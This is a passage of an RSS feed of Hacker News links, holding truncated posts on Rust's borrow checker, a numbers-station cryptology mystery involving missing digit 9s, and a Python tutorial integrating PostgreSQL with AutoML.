<p><em>Side note: There is a fantastic tutorial called <a href="https://rust-unofficial.github.io/too-many-lists/">Learning Rust with Entirely Too Many Linked Lists</a>, by Alexis Beingessner. It’s a great resource for learning to deal with the borrow checker in a practical way. This has been a lifesaver!</em></p>



<p>The similarity in the struggles is what made me think that perhaps Rust is way more functional than it appears to be and that approaching Rust in an imperative way is only a sure path to borrow checker headaches. But this is hard to realize because Rust does look very imperative, so your intuition is to use it in that way.</p>



<p>There is one huge positive aspect of this imperative appearance though: It’s much easier to reason about performance. Once you pass the borrow …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ceronman.com/2020/09/17/is-rust-a-functional-language-in-disguise/">https://ceronman.com/2020/09/17/is-rust-a-functional-language-in-disguise/</a></em></p>]]>
            </description>
            <link>https://ceronman.com/2020/09/17/is-rust-a-functional-language-in-disguise/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515759</guid>
            <pubDate>Fri, 18 Sep 2020 12:23:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Did a broken random number generator in Cuba help expose a Russian spy network?]]>
            </title>
            <description>
<![CDATA[
Score 27 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24515717">thread link</a>) | @privong
<br/>
September 18, 2020 | https://www.mattblaze.org/blog/neinnines/ | <a href="https://web.archive.org/web/*/https://www.mattblaze.org/blog/neinnines/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="center"><div>
		<p>18 September 2020</p><p>A Cryptologic Mystery</p>
	<p>Did a broken random number generator in Cuba help expose a Russian espionage network?</p>




	
<p>
I picked up the new book <em>Compromised</em> last week and was intrigued to discover that it may have shed some light on a small (and rather esoteric) cryptologic and espionage mystery that I've been puzzling over for about 15 years. <em>Compromised</em> is primarily a memoir of former FBI counterintelligence agent Peter Strzok's investigation into Russian operations in the lead up to the 2016 presidential election, but this post is not a review of the book or concerned with that aspect of it.
</p><p>
Early in the book, as an almost throwaway bit of background color, Strzok discusses his work in Boston investigating the famous Russian "illegals" espionage network from 2000 until their arrest (and subsequent exchange with Russia) in 2010. "Illegals" are foreign agents operating abroad under false identities and without official or diplomatic cover. In this case, ten Russian illegals were living and working in the US under false Canadian and American identities. (The case inspired the recent TV series <em>The Americans</em>.)
</p><p>
Strzok was the case agent responsible for two of the suspects, Andrey Bezrukov and Elena Vavilova (posing as a Canadian couple under the aliases Donald Heathfield and Tracey Lee Ann Foley). The author recounts watching from the street on Thursday evenings as Vavilova received encrypted shortwave "numbers" transmissions in their Cambridge, MA apartment.
</p><p>
Given that Bezrukov and Vaviloa were indeed, as the FBI suspected, Russian spies, it's not surprising that they were sent messages from headquarters using this method; numbers stations are part of time-honored espionage tradecraft for communicating with covert agents. But their capture may have illustrated how subtle errors can cause these systems to fail badly in practice, even when the cryptography itself is sound.
<br>
<a name="fold">&nbsp;</a></p><hr size="1"><p>
	

First, a bit of background. For at least the last sixty years, encrypted shortwave radio transmissions have been a standard method for sending messages to covert spies abroad. Shortwave radio has several attractive properties here. It covers long distances; it's possible for a single transmitter to get hemispheric or even global coverage. Shortwave radio receivers, while less common than they once were, are readily available commercially in almost every country and are not usually suspicious or alerting to possess. And while it's relatively easy to tell where a shortwave signal is coming from, their wide coverage area makes it very difficult to infer exactly who or where the intended recipients might be. Both the US (and its allies) and the Soviet Union (and its satellites) made extensive use of shortwave radio for communicating with spies during the cold war, and enigmatic "numbers" transmissions aimed at spies continue to this day.
</p><p>
The encryption method of choice used by numbers stations is called a "one time pad" (OTP) cipher. OTPs have unique advantages over other encryption methods. Used properly, they are <em>unconditionally</em> secure; no amount of computing power or ingenuity can "break" them without knowledge of the secret key. Also, they are almost deceptively low tech. It is possible to encrypt and decrypt OTP messages by hand with nothing more than paper and pencil and simple arithmetic. The disadvantage is that OTPs are cumbersome; you need a secret key as long as all the messages you will ever send, with no part of the key ever re-used for multiple messages. Typically, the key would be printed as a series of digits bound into a pad of paper, with each page removed after use; hence the name "one time pad". OTPs can be difficult in practice to use properly and are quite vulnerable if used improperly; more on that later.
</p><p>
The OTP messages sent to spies by shortwave radio typically consist of decimal digits broadcast in either a mechanically recorded voice or in morse code (more recently, digital transmissions are also used) on designated frequencies at designated times, usually in four or five digit groups (hence the term "numbers station"). After copying and verifying a header in the message, the agent would remove the corresponding page from their secret OTP codebook and add each key digit to each corresponding message digit using modulo-10 arithmetic (without carry). The resulting "plaintext" digits are then converted to text with a simple substitution encoding (e.g, A=01, B=02, etc., although other encodings are generally used). That's all there is to it. The security of the system depends entirely on the uniqueness and secrecy of the OTP codebook pad given to each agent.
</p><p>
To prevent "traffic analysis" that might reveal to an observer the number of active agents or the volume of messages sent to them, numbers stations typically operate on rigidly fixed schedules, sending messages at pre-determined times whether there is actually a message to be sent or not. When there is no traffic for a given timeslot, random dummy "fill" traffic is sent instead. The fill traffic should be indistinguishable to an outsider from real messages, thereby leaking nothing about how often or when the true messages are being sent. But more on this later.
</p><p>
None of this is by itself news. The existence of numbers stations has been publicly known (and tracked by hobbyists) since at least the 1960's, and OTPs are an elementary cryptographic technique known to every cryptographer. However, Strzok mentions two interesting details I'd not seen published previously and that may solve a mystery about one of the most well known numbers stations heard in North America.
</p><p>
First, <em>Compromised</em> reveals that the FBI found that during at least some of the time the illegals were under investigation, the Russian numbers intended for them were sent not by a transmitter in Russia (which might have difficulty being reliably received in the US), but relayed by the <em>Cuban</em> shortwave numbers station. This is perhaps a bit surprising, since the period in question (2000-2010) was well after the Soviet Union, the historic protector of Cuba's government, had ceased to exist.
</p><p>
The Cuban numbers station is somewhat legendary. It is a powerful station, operated by Cuba's intelligence directorate but co-located with Radio Habana's transmitters near Bauta, Cuba, and is easily received with even very modest equipment throughout the US. While its numbers transmissions have taken a variety of forms over the years, during the early 2000's it operated around the clock, transmitting in both voice and morse code. The station was (and remains) so powerful and widely heard that radio hobbyists quickly derived its hourly schedule. During this period, each scheduled hourly transmission consisted of a preamble followed by three messages, each made up entirely of a series of five digit groups (with by a brief period of silence separating the three messages). The three hourly messages would take a total of about 45 minutes, in either voice or morse code depending on the scheduled time and frequency. Every hour, the same thing, predictably right on schedule (with fill traffic presumably substituted for the slots during which there was no actual message).
</p><p>
If you want to hear what this sounded like, here's a recording I made on October 4, 2008 of one of the hourly voice transmissions, as received (static and all) in my Philadelphia apartment: <a target="_blank" href="https://www.mattblaze.org/private/17435khz-200810041700.mp3"><tt>www.mattblaze.org/private/17435khz-200810041700.mp3</tt></a>. The transmission follows the standard Cuban numbers format of the time, starting with an "Atenćion" preamble listing three five-digit identifiers for the three messages that follow, and ending with "Final, Final". In this recording, the first of the three messages (64202) starts at 3:00, the second (65852) at 16:00, and the third (86321) at 29:00, with the "Final" signoff at the end. The transmissions are, to my cryptographic ear at least, both profoundly dull and yet also eerily riveting. 
</p><p>
And this is where the mystery I've been wondering about comes in. In 2007, I noticed an odd anomaly: some messages completely lacked the digit 9 ("nueve"). Most messages had, as they always did and as you'd expect with OTP ciphertext, a uniform distribution of the digits 0-9. But other messages, at random times, suddenly had no 9s at all. I wasn't the only (or the first) person to notice this; apparently the 9s started disappearing from messages some time around 2005.
</p><p>
This is, to say the least, very odd. The way OTPs work should produce a uniform distribution of all ten digits in the ciphertext. The odds of an entire message lacking 9s (or any other digit) are infinitesimal. And yet such messages were plainly being transmitted, and fairly often at that. In fact, in the recording of the 2008 transmission linked to above, you will notice that while the second and third messages use all ten digits, the first is completely devoid of 9s.
</p><p>
I remember concluding that the most likely, if still rather improbable, explanation was that the 9-less messages were dummy fill traffic and that the random number generator used to create the messages had a bug or developed a defect that prevented 9s from being included. This would be, to say the least, a very serious error, since it would allow a listener to easily distinguish fill traffic from real traffic, completely negating the benefit of having fill traffic in the first place. It would open the door to exactly the kind of traffic analysis that the system was carefully engineered to thwart. The 9-less messages went on for almost ten years. (If I were reporting this as an Internet vulnerability, I would dub it the "Nein Nines" attack; please forgive the linguistic muddle). But I was resigned to the likelihood that I would never know for sure.
</p><p>
And this brings us to the second observation from Strzok's book.
</p><p>
<em>Compromised</em> doesn't say anything about missing nueves, but he does mention that the FBI exploited a serious tradecraft error on the part of the sender: the FBI was able …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mattblaze.org/blog/neinnines/">https://www.mattblaze.org/blog/neinnines/</a></em></p>]]>
            </description>
            <link>https://www.mattblaze.org/blog/neinnines/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515717</guid>
            <pubDate>Fri, 18 Sep 2020 12:17:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: PostgreSQL and Machine Learning - step-by-step python tutorial]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24515598">thread link</a>) | @pplonski86
<br/>
September 18, 2020 | https://mljar.com/blog/postgresql-machine-learning/ | <a href="https://web.archive.org/web/*/https://mljar.com/blog/postgresql-machine-learning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<p><img src="https://raw.githubusercontent.com/mljar/mljar-examples/master/media/PostgreSQL_AutoML_v2.png" alt="PostgreSQL and Machine Learning"></p>

<p>I will show you how to apply Machine Learning algorithms on data from the PostgreSQL database to get insights and predictions. I will use an Automated Machine Learning (AutoML) <a href="https://github.com/mljar/mljar-supervised"><strong>supervised</strong></a>. It is an open-source python package. Thanks to AutoML I will get quick access to many ML algorithms: Decision Tree, Logistic Regression, Random Forest, Xgboost, Neural Network. The AutoML will handle feature engineering as well. I will show you python code snippets that can be reused to integrate Machine Learning with PostgreSQL as a part of the ETL pipeline.</p>

<p>You can find all the code used in this post in the <a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML">GitHub</a>.</p>

<hr>

<h2 id="the-marketing-data">The marketing data</h2>

<p>I will use <a href="https://www.kaggle.com/yufengsui/portuguese-bank-marketing-data-set"><strong>Portugese Bank Marketing</strong></a> dataset (<code>bank_cleaned.csv</code> file). This dataset is about the marketing campaigns, which aim to promote financial products for existing customers of a Portuguese bank. The each contact to the client is described by:</p>

<div><div><pre><code><span>columns</span> <span>=</span> <span>[</span><span>"age"</span><span>,</span> <span>"job"</span><span>,</span> <span>"marital"</span><span>,</span> <span>"education"</span><span>,</span> <span>"default_payment"</span><span>,</span> <span>"balance"</span><span>,</span> <span>"housing"</span><span>,</span>
           <span>"loan"</span><span>,</span> <span>"day"</span><span>,</span> <span>"month"</span><span>,</span> <span>"duration"</span><span>,</span> <span>"campaign"</span><span>,</span> <span>"pdays"</span><span>,</span> <span>"previous"</span><span>,</span> <span>"poutcome"</span>
           <span>"response"</span> <span># the target</span>
          <span>]</span>
</code></pre></div></div>

<p>The <code>response</code> is the taget column, which contains the information if customer subscribed to the financial product. The goal of the analysis will be to predict whether customer will select the subscription.</p>

<p>In this analysis I will split the dataset into:</p>

<ul>
  <li>training data (<code>32,672</code> samples),</li>
  <li>testing data (<code>8,169</code> samples).</li>
</ul>

<p>All datasets are inserted into database, but <strong>for testing data the <code>response</code> is not inserted</strong>.</p>

<h2 id="setup-postgresql-database-in-docker">Setup PostgreSQL database in Docker</h2>

<p>I will set-up the PostgreSQL database in the docker.</p>

<p>The <code>Dockerfile</code> with PostgreSQL:</p>

<div><div><pre><code>FROM postgres:alpine
EXPOSE 5555
</code></pre></div></div>

<p>To build docker image and run container:</p>

<div><div><pre><code>docker build -t mydb:latest .
docker run --name my_local_db -e POSTGRES_PASSWORD=1234 -e POSTGRES_DB=db -p 5555:5432 mydb:latest
</code></pre></div></div>

<h2 id="create-table-and-insert-the-training-data">Create table and insert the training data</h2>

<p>For interacting with the database I will use python scripts and <code>psycopg2</code> package. To initialize the database please use the <a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/init_db.py"><code>init_db.py</code></a> file. Let’s dig into the code.</p>

<div><div><pre><code><span>""" init_db.py file """</span>
<span>import</span> <span>numpy</span> <span>as</span> <span>np</span>
<span>import</span> <span>pandas</span> <span>as</span> <span>pd</span>
<span>import</span> <span>psycopg2</span>
<span>from</span> <span>io</span> <span>import</span> <span>StringIO</span>

<span>from</span> <span>sklearn.model_selection</span> <span>import</span> <span>train_test_split</span>
<span>from</span> <span>db</span> <span>import</span> <span>db_engine</span> 

<span>create_table_sql</span> <span>=</span> <span>"""
CREATE TABLE IF NOT EXISTS marketing (
    id serial PRIMARY KEY,
    age integer,
    job varchar(128),
    marital varchar(128),
    education varchar(128),
    default_payment varchar(128),
    balance integer,
    housing varchar(128),
    loan varchar(128),
    day integer,
    month varchar(128),
    duration real,
    campaign integer, 
    pdays integer,
    previous integer,
    poutcome varchar(128),
    response varchar(128),
    predicted_response varchar(128)
)
"""</span>

<span>get_data_sql</span> <span>=</span> <span>"""select * from marketing"""</span>

<span>df</span> <span>=</span> <span>pd</span><span>.</span><span>read_csv</span><span>(</span><span>"data/bank_cleaned.csv"</span><span>,</span> <span>index_col</span><span>=</span><span>"id"</span><span>)</span>
<span>df</span><span>.</span><span>drop</span><span>(</span><span>"response_binary"</span><span>,</span> <span>axis</span><span>=</span><span>1</span><span>,</span> <span>inplace</span><span>=</span><span>True</span><span>)</span>
<span>df</span><span>[</span><span>"predicted_response"</span><span>]</span> <span>=</span> <span>""</span>
<span>test_size</span><span>=</span> <span>0.20</span> <span># 20% for testing</span>
<span>df_train</span><span>,</span> <span>df_test</span> <span>=</span> <span>train_test_split</span><span>(</span><span>df</span><span>,</span> <span>test_size</span><span>=</span><span>test_size</span><span>,</span> <span>random_state</span><span>=</span><span>1234</span><span>)</span>
<span>df_train</span><span>.</span><span>to_csv</span><span>(</span><span>"data/train.csv"</span><span>)</span>
<span>df_test</span><span>.</span><span>to_csv</span><span>(</span><span>"data/test.csv"</span><span>)</span>
<span>df_test</span> <span>=</span> <span>df_test</span><span>.</span><span>copy</span><span>()</span>
<span>df_test</span><span>[</span><span>"response"</span><span>]</span> <span>=</span> <span>""</span>

<span>df</span> <span>=</span> <span>pd</span><span>.</span><span>concat</span><span>([</span><span>df_train</span><span>,</span> <span>df_test</span><span>])</span>

<span>try</span><span>:</span>
    <span>conn</span> <span>=</span> <span>psycopg2</span><span>.</span><span>connect</span><span>(</span><span>db_engine</span><span>())</span>
    <span>cur</span> <span>=</span> <span>conn</span><span>.</span><span>cursor</span><span>()</span>
    <span>print</span><span>(</span><span>"Create marketing table"</span><span>)</span>
    <span>cur</span><span>.</span><span>execute</span><span>(</span><span>create_table_sql</span><span>)</span>
    <span>conn</span><span>.</span><span>commit</span><span>()</span>
    <span>print</span><span>(</span><span>"Insert train and test data into table ..."</span><span>)</span>
    <span>buffer</span> <span>=</span> <span>StringIO</span><span>()</span>
    <span>df</span><span>.</span><span>to_csv</span><span>(</span><span>buffer</span><span>,</span> <span>index_label</span><span>=</span><span>"id"</span><span>,</span> <span>header</span><span>=</span><span>False</span><span>)</span>
    <span>buffer</span><span>.</span><span>seek</span><span>(</span><span>0</span><span>)</span>
    <span>cur</span><span>.</span><span>copy_from</span><span>(</span><span>buffer</span><span>,</span> <span>"marketing"</span><span>,</span> <span>sep</span><span>=</span><span>","</span><span>)</span>
    <span>conn</span><span>.</span><span>commit</span><span>()</span>
    <span>print</span><span>(</span><span>"Insert finished."</span><span>)</span>

    <span>cur</span><span>.</span><span>close</span><span>()</span>
<span>except</span> <span>Exception</span> <span>as</span> <span>e</span><span>:</span>
    <span>print</span><span>(</span><span>"Problems:"</span><span>,</span> <span>str</span><span>(</span><span>e</span><span>))</span>
</code></pre></div></div>

<p>The code is doing three things:</p>

<ol>
  <li>Create the <code>marketing</code> table if it not exists.</li>
  <li>Split the data into train and test sets (<code>80%/20%</code> split). Datasets are saved to the disk.</li>
  <li>Datasets are inserted into table in the database. The <code>response</code> values is removed from test samples.</li>
</ol>

<p>The data is in the database. Let’s log into PostgreSQL to check:</p>

<div><div><pre><code>&gt; psql -U postgres -d db --host=0.0.0.0 --port=5555 

db=# select count(*) from marketing;
 count 
-------
 40841
(1 row)

db=# select response, count(*) from marketing group by response;
 response | count 
----------+-------
 no       | 28952
          |  8169
 yes      |  3720
(3 rows)
</code></pre></div></div>

<h2 id="lets-train-the-machine-learning-models">Let’s train the Machine Learning models!</h2>

<p>To integrate PostgreSQL with Machine Learning we will need:</p>

<ul>
  <li>method to get training data - <code>get_train_data()</code>,</li>
  <li>method to get live data (for computing predictions) - <code>get_live_data()</code>,</li>
  <li>method to insert predictions into the database - <code>insert_predictions(predictions, ids)</code>,</li>
  <li>method to get predictions (to compute the accuracy) - <code>get_predictions()</code>.</li>
</ul>

<p>I’ve created <a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/db.py"><code>db.py</code></a> file to communicate with the database (with <code>psychopg2</code>):</p>

<div><div><pre><code> <span>""" db.py file """</span>
 <span>""" Database API """</span>
<span>import</span> <span>json</span>
<span>import</span> <span>numpy</span> <span>as</span> <span>np</span>
<span>import</span> <span>pandas</span> <span>as</span> <span>pd</span>
<span>import</span> <span>psycopg2</span>
<span>from</span> <span>io</span> <span>import</span> <span>StringIO</span>

<span>def</span> <span>db_engine</span><span>():</span>
    <span>config</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>open</span><span>(</span><span>"config.json"</span><span>))</span>
    <span>host</span> <span>=</span> <span>config</span><span>[</span><span>"connection"</span><span>][</span><span>"host"</span><span>]</span>
    <span>port</span> <span>=</span> <span>config</span><span>[</span><span>"connection"</span><span>][</span><span>"port"</span><span>]</span>
    <span>user</span> <span>=</span> <span>config</span><span>[</span><span>"connection"</span><span>][</span><span>"user"</span><span>]</span>
    <span># password should be hidden in production setting</span>
    <span># do not store it in config.json</span>
    <span>password</span> <span>=</span> <span>config</span><span>[</span><span>"connection"</span><span>][</span><span>"password"</span><span>]</span>
    <span>db</span> <span>=</span> <span>config</span><span>[</span><span>"connection"</span><span>][</span><span>"db"</span><span>]</span>

    <span>return</span> <span>"user='{}' password='{}' host='{}' port='{}' dbname='{}'"</span><span>.</span><span>format</span><span>(</span>
        <span>user</span><span>,</span> <span>password</span><span>,</span> <span>host</span><span>,</span> <span>port</span><span>,</span> <span>db</span>
    <span>)</span>

<span>def</span> <span>sql_to_df</span><span>(</span><span>sql_query</span><span>):</span>
    <span>try</span><span>:</span>
        <span>conn</span> <span>=</span> <span>psycopg2</span><span>.</span><span>connect</span><span>(</span><span>db_engine</span><span>())</span>
        <span>cur</span> <span>=</span> <span>conn</span><span>.</span><span>cursor</span><span>()</span>
        <span>cur</span><span>.</span><span>execute</span><span>(</span><span>sql_query</span><span>)</span>
        <span>df</span> <span>=</span> <span>pd</span><span>.</span><span>DataFrame</span><span>(</span><span>cur</span><span>.</span><span>fetchall</span><span>(),</span> <span>columns</span><span>=</span><span>[</span><span>elt</span><span>[</span><span>0</span><span>]</span> <span>for</span> <span>elt</span> <span>in</span> <span>cur</span><span>.</span><span>description</span><span>])</span>
        <span>cur</span><span>.</span><span>close</span><span>()</span>
        <span>return</span> <span>df</span>
    <span>except</span> <span>Exception</span> <span>as</span> <span>e</span><span>:</span>
        <span>print</span><span>(</span><span>"Problems:"</span><span>,</span> <span>str</span><span>(</span><span>e</span><span>))</span>
    
    <span>return</span> <span>None</span>


<span>def</span> <span>get_train_data</span><span>():</span>
    <span>config</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>open</span><span>(</span><span>"config.json"</span><span>))</span>
    <span>table</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"table"</span><span>]</span>
    <span>features</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"features"</span><span>]</span>
    <span>target</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"target"</span><span>]</span>
    <span>get_data_sql</span> <span>=</span> <span>f</span><span>"select {','.join(features+[target])} from {table} where {target} != ''"</span>
    <span>df</span> <span>=</span> <span>sql_to_df</span><span>(</span><span>get_data_sql</span><span>)</span>
    <span>if</span> <span>df</span> <span>is</span> <span>None</span><span>:</span>
        <span>return</span> <span>None</span><span>,</span> <span>None</span>
    <span>return</span> <span>df</span><span>[</span><span>features</span><span>],</span> <span>df</span><span>[</span><span>target</span><span>]</span>
    
    
<span>def</span> <span>get_live_data</span><span>():</span>
    <span>config</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>open</span><span>(</span><span>"config.json"</span><span>))</span>
    <span>table</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"table"</span><span>]</span>
    <span>features</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"features"</span><span>]</span>
    <span>target</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"target"</span><span>]</span>
    <span>predicted</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"predicted"</span><span>]</span>
    <span>id_column</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"id"</span><span>]</span>
    <span>get_data_sql</span> <span>=</span> <span>f</span><span>"select {','.join(features + [id_column])} from {table} where {target} = '' and {predicted} = ''"</span>
    <span>df</span> <span>=</span> <span>sql_to_df</span><span>(</span><span>get_data_sql</span><span>)</span>
    <span>if</span> <span>df</span> <span>is</span> <span>None</span><span>:</span>
        <span>return</span> <span>None</span><span>,</span> <span>None</span>
    <span>return</span> <span>df</span><span>[</span><span>features</span><span>],</span> <span>df</span><span>[</span><span>id_column</span><span>]</span>


<span>def</span> <span>get_predictions</span><span>():</span>
    <span>config</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>open</span><span>(</span><span>"config.json"</span><span>))</span>
    <span>table</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"table"</span><span>]</span>
    <span>target</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"target"</span><span>]</span>
    <span>predicted</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"predicted"</span><span>]</span>
    <span>id_column</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"id"</span><span>]</span>
    <span>get_data_sql</span> <span>=</span> <span>f</span><span>"select {','.join([predicted] + [id_column])} from {table} where {target} = ''"</span>
    <span>df</span> <span>=</span> <span>sql_to_df</span><span>(</span><span>get_data_sql</span><span>)</span>
    <span>if</span> <span>df</span> <span>is</span> <span>None</span><span>:</span>
        <span>return</span> <span>None</span>
    <span>df</span><span>.</span><span>index</span> <span>=</span> <span>df</span><span>[</span><span>id_column</span><span>]</span>
    <span>return</span> <span>df</span>
    
<span>def</span> <span>insert_predictions</span><span>(</span><span>predictions</span><span>,</span> <span>ids</span><span>):</span>
    <span>config</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>open</span><span>(</span><span>"config.json"</span><span>))</span>
    <span>table</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"table"</span><span>]</span>
    <span>predicted</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"predicted"</span><span>]</span>
    <span>id_column</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"id"</span><span>]</span>

    <span>try</span><span>:</span>
        <span>conn</span> <span>=</span> <span>psycopg2</span><span>.</span><span>connect</span><span>(</span><span>db_engine</span><span>())</span>
        <span>cur</span> <span>=</span> <span>conn</span><span>.</span><span>cursor</span><span>()</span>
        <span>tuples</span> <span>=</span> <span>list</span><span>(</span><span>zip</span><span>(</span><span>predictions</span><span>,</span> <span>ids</span><span>))</span>
        <span>sql_query</span> <span>=</span> <span>f</span><span>"update {table} set {predicted} = </span><span>%</span><span>s where {id_column} = </span><span>%</span><span>s"</span>
        <span>cur</span><span>.</span><span>executemany</span><span>(</span><span>sql_query</span><span>,</span> <span>tuples</span><span>)</span>
        <span>conn</span><span>.</span><span>commit</span><span>()</span>
    <span>except</span> <span>Exception</span> <span>as</span> <span>e</span><span>:</span>
        <span>print</span><span>(</span><span>"Problems:"</span><span>,</span> <span>str</span><span>(</span><span>e</span><span>))</span>
</code></pre></div></div>

<p>You can see that all information needed to connect and to get data is loaded from <a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/config.json"><code>config.json</code></a> file:</p>

<div><div><pre><code>{
    "connection": {
        "host": "0.0.0.0",
        "port": 5555,
        "user": "postgres",
        "password": "1234",
        "db": "db"
    },
    "automl": {
        "table": "marketing",
        "features": [
            "age",
            "job",
            "marital",
            "education",
            "default_payment",
            "balance",
            "housing",
            "loan",
            "day",
            "month",
            "duration",
            "campaign",
            "pdays",
            "previous",
            "poutcome"
        ],
        "target": "response",
        "predicted": "predicted_response",
        "id": "id"
    }
}
</code></pre></div></div>

<ul>
  <li>This file contains connection details (<code>host</code>, <code>port</code>, <code>user</code>, <code>password</code>, <code>db</code>).</li>
  <li>Additionaly, it defines the data source for Machine Learning (<code>table</code> parameter). The <code>features</code> describe the AutoML input, <code>target</code> - the AutoML output, <code>predicted</code> -  the name of the column where predictions will be stored, and <code>id</code> is the index column.</li>
  <li>You can resuse this file to define your own integration of PostgreSQL with AutoML.</li>
  <li>The password is in the config file just for example purposes. In production setting, it should be hidden (as environment variable).</li>
</ul>

<h2 id="lets-train-automl">Let’s train AutoML</h2>

<p>You might find it suprissing but there are only <code>5</code> lines of code in the <a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/train_automl.py"><code>train_automl.py</code></a> file:</p>

<div><div><pre><code><span>""" train_automl.py file """</span>
<span>from</span> <span>db</span> <span>import</span> <span>get_train_data</span>
<span>from</span> <span>supervised</span> <span>import</span> <span>AutoML</span>

<span># get the training data</span>
<span>X_train</span><span>,</span> <span>y_train</span> <span>=</span> <span>get_train_data</span><span>()</span>
<span># train AutoML</span>
<span>automl</span> <span>=</span> <span>AutoML</span><span>(</span><span>results_path</span><span>=</span><span>"Response_Classifier"</span><span>)</span>
<span>automl</span><span>.</span><span>fit</span><span>(</span><span>X_train</span><span>,</span> <span>y_train</span><span>)</span>
</code></pre></div></div>

<p>This code gets data for training from the database and <code>fit()</code> AutoML object. The result of the AutoML are saved in <a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML/Response_Classifier"><code>Response_Classifier</code></a> directory. All models and preprocessing details are <strong>automatically saved</strong> to the hard drive. Additionally, the <code>README.md</code> Markdown reports are created for AutoML and each Machine Learning model. You can check them on GitHub, here are links for few examples:</p>

<ul>
  <li><a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML/Response_Classifier#automl-leaderboard">AutoML leaderboard report</a>,</li>
  <li><a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/Response_Classifier/2_DecisionTree/README.md">Decision Tree report</a>,</li>
  <li><a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/Response_Classifier/5_Default_Xgboost/README.md">Xgboost report</a>.</li>
</ul>

<table>
  <thead>
    <tr>
      <th>Best model</th>
      <th>name</th>
      <th>model_type</th>
      <th>metric_type</th>
      <th>metric_value</th>
      <th>train_time</th>
      <th>Link</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>&nbsp;</td>
      <td>1_Baseline</td>
      <td>Baseline</td>
      <td>logloss</td>
      <td>0.354508</td>
      <td>0.32</td>
      <td><a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML/Response_Classifier/1_Baseline/README.md">Results link</a></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>2_DecisionTree</td>
      <td>Decision Tree</td>
      <td>logloss</td>
      <td>0.269144</td>
      <td>15.8</td>
      <td><a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML/Response_Classifier/2_DecisionTree/README.md">Results link</a></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>3_Linear</td>
      <td>Linear</td>
      <td>logloss</td>
      <td>0.237079</td>
      <td>7.45</td>
      <td><a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML/Response_Classifier/3_Linear/README.md">Results link</a></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>4_Default_R…</td></tr></tbody></table></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mljar.com/blog/postgresql-machine-learning/">https://mljar.com/blog/postgresql-machine-learning/</a></em></p>]]>
            </description>
            <link>https://mljar.com/blog/postgresql-machine-learning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515598</guid>
            <pubDate>Fri, 18 Sep 2020 11:59:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dogfooding Splitgraph for cross-database analytics in Metabase]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24515353">thread link</a>) | @mildbyte
<br/>
September 18, 2020 | https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase | <a href="https://web.archive.org/web/*/https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase">archive.org</a>
